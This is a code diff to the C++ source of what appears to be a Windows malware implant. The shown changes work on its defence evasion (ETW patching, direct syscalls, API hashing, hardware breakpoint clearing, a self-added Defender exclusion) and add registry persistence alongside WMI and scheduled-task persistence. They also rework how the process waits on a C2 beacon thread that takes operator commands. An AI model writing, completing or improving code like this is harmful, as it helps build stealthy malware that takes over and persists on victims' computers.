@@ -37,7 +37,7 @@ DWORD WINAPI ImplantThread(LPVOID) {
         return 0;
     }
 
-    // Loop InitializeSyscalls until success
+    // Loop InitializeSyscalls until success — EDR may delay ntdll mapping
     while (!InitializeSyscalls()) {
         NtSleep(5000);
     }
@@ -47,20 +47,24 @@ DWORD WINAPI ImplantThread(LPVOID) {
     PatchETW();
     ClearHardwareBreakpoints();
 
-    // Optional: add Defender exclusion if elevated
-    wchar_t exePath[MAX_PATH];
+    wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
+
     if (IsElevated()) {
         AddDefenderExclusion(exePath);
     }
 
-    // Install persistence (WMI and Scheduled Tasks)
+    // Install all persistence mechanisms — registry is a fast fallback
+    // that doesn't require WMI and survives partial cleanups.
+    InstallRegistryPersistence(exePath);
     if (!IsWmiPersistenceInstalled()) {
         InstallWmiPersistence(exePath);
     }
-    InstallScheduledTaskPersistence(exePath);
+    if (!IsScheduledTaskInstalled()) {
+        InstallScheduledTaskPersistence(exePath);
+    }
 
-    // Enter C2 beacon loop
+    // Enter C2 beacon loop — returns only on clean "exit" command
     BeaconLoop();
 
     return 0;
@@ -71,20 +75,20 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hKernel32) return 0;
-    
-    auto _CreateThread = HASHPROC(hKernel32, CreateThread);
-    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
-    if (!_CreateThread || !_CloseHandle) return 0;
+
+    auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
+    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
+    auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
+    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle) return 0;
 
     HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
-    if (hThread) {
-        _CloseHandle(hThread);
-    }
+    if (!hThread) return 0;
 
-    // Main thread: NtDelayExecution loop — no Sleep() in IAT
-    while (true) {
-        NtSleep(60000);
-    }
+    // Block until ImplantThread exits (either SandboxCheck abort or clean
+    // "exit" command from operator).  Avoids the zombie spin-loop and lets
+    // the process exit cleanly — no artifact threads left behind.
+    _WaitForSingleObject(hThread, INFINITE);
+    _CloseHandle(hThread);
 
     return 0;
 }
